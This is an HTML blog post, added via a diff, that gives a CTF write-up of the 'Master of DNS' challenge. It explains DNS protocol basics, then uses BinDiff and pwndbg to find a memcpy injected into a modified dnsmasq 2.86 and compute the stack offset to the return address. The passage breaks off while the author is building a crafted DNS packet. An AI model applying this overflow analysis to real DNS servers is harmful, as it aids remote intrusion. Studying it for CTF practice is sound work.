@@ -156,6 +156,327 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">DNS协议+BinDiff的使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-07-28 20:10:08 / Modified: 20:14:01" itemprop="dateCreated datePublished" datetime="2022-07-28T20:10:08+08:00">2022-07-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>Master of DNS 复现</strong></p>
+<p>提示：题目参考代码: <a target="_blank" rel="noopener" href="https://thekelleys.org.uk/dnsmasq/doc.html">https://thekelleys.org.uk/dnsmasq/doc.html</a> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dns: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=bfc562d299a85ac0c0be7037b9436f0a9500d2c4, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>32位，dynamically，开了 NX，Full RELRO</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">port=<span class="number">9999</span></span><br><span class="line">no-resolv</span><br><span class="line">server = <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">server = <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">listen-address=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">bind-interfaces</span><br><span class="line">no-hosts</span><br><span class="line">no-negcache</span><br><span class="line">address=/test.com/<span class="number">5.5</span><span class="number">.5</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>没有遇见过的东西，先学习相关知识</li>
+</ul>
+<p><strong>域名</strong></p>
+<p>域名又称网域，是由一串用点分隔的名字组成的 Internet 上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（由于 IP 地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名）</p>
+<p>域名具有一定的层次结构，从上到下依次为：<strong>根域名</strong>， <strong>顶级域名</strong>（top level domain，TLD）， <strong>二级域名</strong>，（三级域名） </p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658901597891.png" alt="1658901597891"> </p>
+<p>理论上，<strong>所有域名的查询都必须先查询根域名</strong>，因为只有根域名才能告诉你，某个顶级域名由哪台服务器管理，事实上也确实如此，ICANN 维护着一张列表（根域名列表），里面记载着顶级域名和对应的托管商</p>
+<p><strong>域名服务器</strong></p>
+<p>域名服务器是指 <strong>管理域名的主机和相应的软件</strong> ，它可以管理所在分层的域的相关信息，一个域名服务器所负责管里的分层叫作 <strong>区 (ZONE)</strong>，域名的每层都设有一个域名服务器：</p>
+<ul>
+<li>根域名服务器<ul>
+<li>保存 DNS 根区文件（ICANN 维护的根域名列表）的服务器，就叫做 <strong>DNS 根域名服务器</strong>（root name server），根域名服务器 <strong>保存所有的顶级域名服务器的地址</strong> </li>
+<li>一般来说所有的域名服务器都会注册一份根域名服务器的 IP 地址的缓存，用于在必要的时候向其发送请求</li>
+</ul>
+</li>
+<li>顶级域名服务器<ul>
+<li>顶级域名服务器显然就是用来 <strong>管理注册在该顶级域名下的所有二级域名</strong> 的，记录这些二级域名的 IP 地址</li>
+</ul>
+</li>
+<li>权限域名服务器<ul>
+<li>三/四级域名数量很多，我们需要使用 <strong>划分区</strong> 的办法来解决这个问题，权限域名服务器 <strong>就是负责管理一个“区”</strong> 的域名服务器</li>
+</ul>
+</li>
+<li>本地域名服务器（不在 DNS 层次结构之中）<ul>
+<li>本地域名服务器（也被称为权威域名服务器），本地域名服务器是 <strong>电脑解析时的默认域名服务器，即电脑中设置的首选 DNS 服务器和备选 DNS 服务器</strong>，常见的有电信、联通、谷歌、阿里等的本地 DNS 服务</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658901933634.png" alt="1658901933634"> </p>
+<p><strong>DNS 协议</strong></p>
+<p>通过域名解析协议（DNS，Domain Name System）来将域名和 IP 地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数串</p>
+<ul>
+<li>正向解析：将域名映射成 IP 地址</li>
+<li>反向解析：将 IP 地址映射成域名</li>
+</ul>
+<p>DNS 协议可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53（但大多数情况下 DNS 都使用 UDP 进行传输）</p>
+<p>具体 DNS 查询的方式有两种：</p>
+<ul>
+<li>迭代查询<ul>
+<li>如果请求的接收者不知道所请求的内容，那么 <strong>接收者将告诉请求者如何去获得这个内容</strong>，请求者自己再去查询</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658903022387.png" alt="1658903022387">  </p>
+<ul>
+<li>递归查询<ul>
+<li>如果请求的接收者不知道所请求的内容，那么 <strong>接收者将扮演请求者</strong>，发出有关请求，直到获得所需要的内容，然后将内容返回给最初的请求者 </li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658903003005.png" alt="1658903003005"> </p>
+<p><strong>DNS 数据包结构</strong></p>
+<p>总体结构：</p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976619426.png" alt="1658976619426"> </p>
+<ul>
+<li>DNS 请求包和响应包格式相同（只有 Flag 不一样）</li>
+</ul>
+<p>基础结构部分：（Header）</p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658977012140.png" alt="1658977012140">  </p>
+<ul>
+<li>事务 ID：DNS 报文的 ID 标识。对于请求报文和其对应的应答报文，该字段的值是相同的。通过它可以区分 DNS 应答报文是对哪个请求进行响应的</li>
+<li>标志：DNS 报文中的标志字段</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976734669.png" alt="1658976734669"> </p>
+<ul>
+<li>问题计数：DNS 查询请求的数目</li>
+<li>回答资源记录数：DNS 响应的数目</li>
+<li>权威名称服务器计数：权威名称服务器的数目</li>
+<li>附加资源记录数：额外的记录数目（权威名称服务器对应 IP 地址的数目）  </li>
+</ul>
+<p>问题部分： </p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976977290.png" alt="1658976977290">  </p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976961430.png" alt="1658976961430"> </p>
+<ul>
+<li>查询名：一般为要查询的域名，有时也会是 IP 地址，用于反向查询</li>
+<li>查询类型：DNS 查询请求的资源类型。通常查询类型为 A 类型，表示由域名获取对应的 IP 地址</li>
+<li>查询类：地址类型，通常为互联网地址，值为 1</li>
+</ul>
+<p>资源记录部分：</p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658977108843.png" alt="1658977108843"> </p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658977155842.png" alt="1658977155842"> </p>
+<ul>
+<li>域名：DNS 请求的域名</li>
+<li>类型：资源记录的类型，与问题部分中的查询类型值是一样的</li>
+<li>类：地址类型，与问题部分中的查询类值是一样的</li>
+<li>生存时间：以秒为单位，表示资源记录的生命周期，一般用于当地址解析程序取出资源记录后决定保存及使用缓存数据的时间，它同时也可以表明该资源记录的稳定程度，稳定的信息会被分配一个很大的值</li>
+<li>资源数据长度：资源数据的长度</li>
+<li>资源数据：表示按查询段要求返回的相关资源记录的数据</li>
+</ul>
+<p>PS：其实不用太了解每个部分的功能，只要一模一样就可以了</p>
+<p>DNS请求：</p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658995769276.png" alt="1658995769276"> </p>
+<p>DNS响应：</p>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/20190724165030968.png" alt="20190724165030968"> </p>
+<p>这里只需要注意 Flag，分清楚 <code>DNS请求/DNS响应</code> 就好</p>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/buside/article/details/97139367">Wireshark分析DNS协议</a> </li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/anhenzhufeng/article/details/109860393">DNS报文格式解析（非常详细）</a></li>
+</ul>
+<p><strong>完整域名解析过程</strong></p>
+<p>正向解析：</p>
+<ul>
+<li>首先搜索 <strong>浏览器的 DNS 缓存</strong>，缓存中维护一张域名与 IP 地址的对应表</li>
+<li>若没有命中，则继续搜索 <strong>操作系统的 DNS 缓存</strong></li>
+<li>若仍然没有命中，则操作系统将域名发送至 <strong>本地域名服务器</strong>，本地域名服务器查询自己的 DNS 缓存，查找成功则返回结果（主机和本地域名服务器之间的查询方式是递归查询）</li>
+<li>若本地域名服务器的 DNS 缓存没有命中，则本地域名服务器向上级域名服务器进行查询，通过以下方式进行迭代查询：<ul>
+<li>首先本地域名服务器向 <strong>根域名服务器</strong> 发起请求，根域名服务器是最高层次的，它并不会直接指明这个域名对应的 IP 地址，而是返回顶级域名服务器的地址</li>
+<li>本地域名服务器拿到这个 <strong>顶级域名服务器</strong> 的地址后，就向其发起请求，获取 <strong>权限域名服务器</strong> 的地址</li>
+<li>本地域名服务器根据权限域名服务器的地址向其发起请求，最终得到该域名对应的 IP 地址</li>
+</ul>
+</li>
+<li>本地域名服务器将得到的 IP 地址返回给操作系统，同时自己将 IP 地址缓存起来</li>
+<li>操作系统将 IP 地址返回给浏览器，同时自己也将 IP 地址缓存起来</li>
+<li>至此，浏览器就得到了域名对应的 IP 地址，并将 IP 地址缓存起来</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658903762258.png" alt="1658903762258"> </p>
+<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/351059293">超详细 DNS 协议解析 - 知乎</a> </p>
+<p><strong>调试准备</strong></p>
+<p>首先常规的 GDB 调试是不起作用的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b*<span class="number">0x804F444</span></span><br><span class="line">Breakpoint <span class="number">2</span> at <span class="number">0x804f444</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">dns: failed to create listening socket <span class="keyword">for</span> port <span class="number">53</span>: Permission denied</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">7175</span>) exited with code <span class="number">02</span>]</span><br></pre></td></tr></table></figure>
+<p>因为该程序是运行在端口上的，所以尝试 GDB attach，这里有几个小坑需要注意：</p>
+<ul>
+<li>原来 <code>start.sh</code> 中设置的所有者为 nobody，必须手动启动程序来保证所有者为自己：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dns -C ./dns.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意以下报错：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg: created $rebase, $<span class="function">ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Attaching to process 3294</span></span><br><span class="line"><span class="function">Could <span class="keyword">not</span> attach to process.  If your uid matches the uid of the target</span></span><br><span class="line"><span class="function">process, check the setting of /proc/sys/kernel/yama/ptrace_scope, <span class="keyword">or</span> <span class="keyword">try</span></span></span><br><span class="line"><span class="function">again as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf</span></span><br><span class="line"><span class="function">ptrace: 不允许的操作.</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>解决：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/codeblock/p/5145875.html">非root不能gdb attach的限制</a> </li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>先试试在 README 里面的测试样例：</p>
+<p>输入：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  Master of DNS sudo ./start.sh    </span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  Master of DNS dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">9999</span> baidu.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.16</span><span class="number">.1</span>-Ubuntu &lt;&lt;&gt;&gt; @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">9999</span> baidu.com</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: <span class="number">65211</span></span><br><span class="line">;; flags: qr rd ra; QUERY: <span class="number">1</span>, ANSWER: <span class="number">2</span>, AUTHORITY: <span class="number">0</span>, ADDITIONAL: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: <span class="number">0</span>, flags:; udp: <span class="number">512</span></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.			IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.		<span class="number">405</span>	IN	A	<span class="number">110.242</span><span class="number">.68</span><span class="number">.66</span></span><br><span class="line">baidu.com.		<span class="number">405</span>	IN	A	<span class="number">39.156</span><span class="number">.66</span><span class="number">.10</span></span><br><span class="line"></span><br><span class="line">;; Query time: <span class="number">51</span> msec</span><br><span class="line">;; SERVER: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>#<span class="number">9999</span>(<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>)</span><br><span class="line">;; WHEN: 三 <span class="number">7</span>月 <span class="number">27</span> <span class="number">14</span>:<span class="number">53</span>:<span class="number">21</span> CST <span class="number">2022</span></span><br><span class="line">;; MSG SIZE  rcvd: <span class="number">70</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>题目文件应该是一个小型的 DNS 解析器，在端口 9999 上</li>
+</ul>
+<p>对于这种代码量较大的非原创程序，要么考虑出题人魔改源码，要么在网上找找这个程序的 cve，所以先尝试寻找程序的源码，然后用对比软件进行分析</p>
+<p>在提示中已经给出源码地址了，但是不知道版本，一般就在 IDA 中搜索 “version”，看看能不能发现版本号</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Dns version %s\n&quot;</span>, <span class="string">&quot;2.86&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>逆向分析，发现版本号为 2.86，所以直接去官网上下载源码，进行编译（32位）</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz</span><br><span class="line">tar -zxvf dnsmasq-2.86.tar.gz</span><br><span class="line">cd dnsmasq-2.86</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改Makefile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CFLAGS        = -m32 -fno-stack-protector</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> LDFLAGS       = -m32 -no-pie</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 BinDiff 进行对比（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lsdb/p/10543411.html">BinDiff安装使用教程</a>）</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658922131840.png" alt="1658922131840"> </p>
+<ul>
+<li>发现相似度高达 99%，那么可能是出题人魔改了源码（当然也不排除是 libc 版本的原因），把相似度不是 100% 的几个函数都分析一下：（libc 库函数除外）</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658924092660.png" alt="1658924092660"> </p>
+<ul>
+<li>sub_804F345 VS extract_name：</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658924502529.png" alt="1658924502529"> </p>
+<ul>
+<li>最后在 IDA 中进行确认，发现多了个 <code>memcpy(dest, src, n)</code>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804F</span>432                               loc_804F432:                            ; CODE XREF: sub_804F345+E3↑j</span><br><span class="line">.text:<span class="number">0804F</span>432 <span class="number">83</span> EC <span class="number">04</span>                      sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804F</span>435 FF <span class="number">75</span> E4                      push    [ebp+n]                         ; n</span><br><span class="line">.text:<span class="number">0804F</span>438 FF <span class="number">75</span> <span class="number">14</span>                      push    [ebp+src]                       ; src</span><br><span class="line">.text:<span class="number">0804F</span>43B <span class="number">8</span>D <span class="number">85</span> <span class="number">7F</span> FC FF FF             lea     eax, [ebp+dest]</span><br><span class="line">.text:<span class="number">0804F</span>441 <span class="number">50</span>                            push    eax                             ; dest</span><br><span class="line">.text:<span class="number">0804F</span>442 <span class="number">89</span> D3                         mov     ebx, edx</span><br><span class="line">.text:<span class="number">0804F</span>444 E8 <span class="number">17</span> B6 FF FF                call    _memcpy</span><br><span class="line">.text:<span class="number">0804F</span>444</span><br><span class="line">.text:<span class="number">0804F</span>449 <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0804F</span>44C <span class="number">8B</span> <span class="number">45</span> DC                      mov     eax, [ebp+var_24]</span><br><span class="line">.text:<span class="number">0804F</span>44F E9 BB <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>                jmp     loc_804F60F</span><br></pre></td></tr></table></figure>
+<p>这个 <code>memcpy(dest, src, n)</code> 可能引发栈溢出，所以在 <code>0x804F444</code> 打断点进行调试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x804f444</span>    call   <span class="built_in">memcpy</span>@plt                     &lt;<span class="built_in">memcpy</span>@plt&gt;</span><br><span class="line">       dest: <span class="number">0xffb9c707</span> ◂— <span class="number">0x9bea000</span></span><br><span class="line">       src: <span class="number">0x8e775b0</span> ◂— <span class="string">&#x27;baidu.com&#x27;</span></span><br><span class="line">       n: <span class="number">0xa</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffb9c700</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│       <span class="number">0xffb9c700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│ edx<span class="number">-3</span> <span class="number">0xffb9c704</span> ◂— <span class="number">0x62000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│       <span class="number">0xffb9c708</span> ◂— <span class="string">&#x27;aidu.com&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│       <span class="number">0xffb9c70c</span> ◂— <span class="string">&#x27;.com&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│       <span class="number">0xffb9c710</span> —▸ <span class="number">0x809be00</span> ◂— <span class="string">&#x27; src/config.h&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│       <span class="number">0xffb9c714</span> —▸ <span class="number">0xffb9ccb8</span> —▸ <span class="number">0xffb9ce28</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│       <span class="number">0xffb9c718</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│       <span class="number">0xffb9c71c</span> —▸ <span class="number">0x809be28</span> ◂— <span class="number">0x706964</span> <span class="comment">/* &#x27;dip&#x27; */</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0xffb9ca8c</span> —▸ <span class="number">0x80517ae</span> ◂— add    esp, <span class="number">0x20</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0xffb9ca90</span> —▸ <span class="number">0x8e780a0</span> ◂— <span class="number">0x20019844</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0xffb9ca94</span> ◂— <span class="number">0x32</span> <span class="comment">/* &#x27;2&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0xffb9ca98</span> —▸ <span class="number">0xffb9cabc</span> —▸ <span class="number">0x8e780b7</span> ◂— <span class="number">0x1000100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0xffb9ca9c</span> —▸ <span class="number">0x8e775b0</span> ◂— <span class="string">&#x27;baidu.com&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0xffb9caa0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0xffb9caa4</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0xffb9caa8</span> —▸ <span class="number">0xffb9cbf8</span> —▸ <span class="number">0xffb9cca8</span> —▸ <span class="number">0xffb9ce28</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>理论上是可以覆盖 ret 的，先计算偏移：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0xffb9ca8c</span> <span class="number">0xffb9c707</span></span><br><span class="line"><span class="number">0xffb9ca8c</span>-&gt;<span class="number">0xffb9c707</span> is <span class="number">-0x385</span> bytes (<span class="number">-0xe2</span> words)</span><br></pre></td></tr></table></figure>
+<p>尝试用 dig 发送数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Master of DNS dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">9999</span> baiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiidu.com</span><br><span class="line">dig: <span class="string">&#x27;baiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiidu.com&#x27;</span> <span class="function">is <span class="keyword">not</span> a legal IDNA2008 <span class="title">name</span> <span class="params">(domain label longer than <span class="number">63</span> characters)</span>, use +noidnin</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>尝试发送较长域名发现，dig 直接会提示过长无法发送，要求域名中每个段标签（两个点之间的字符串）长度不能超过 63 字节</li>
+<li>并且总长度不能超过 255 字节</li>
+</ul>
+<p>尝试用 pwntools 手工构造：</p>
+<ul>
+<li>先进行抓包，看看 DNS 请求数据包的结构</li>
+</ul>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658997555648.png" alt="1658997555648">   </p>
+<ul>
+<li>收集数据如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>   b2 b6 <span class="number">01</span> <span class="number">20</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">05</span> <span class="number">62</span> <span class="number">61</span> <span class="number">69</span>   ... .........bai</span><br><span class="line"><span class="number">0010</span>   <span class="number">64</span> <span class="number">75</span> <span class="number">03</span> <span class="number">63</span> <span class="number">6f</span> <span class="number">6</span>d <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">29</span> <span class="number">10</span> <span class="number">00</span>   du.com.......)..</span><br><span class="line"><span class="number">0020</span>   <span 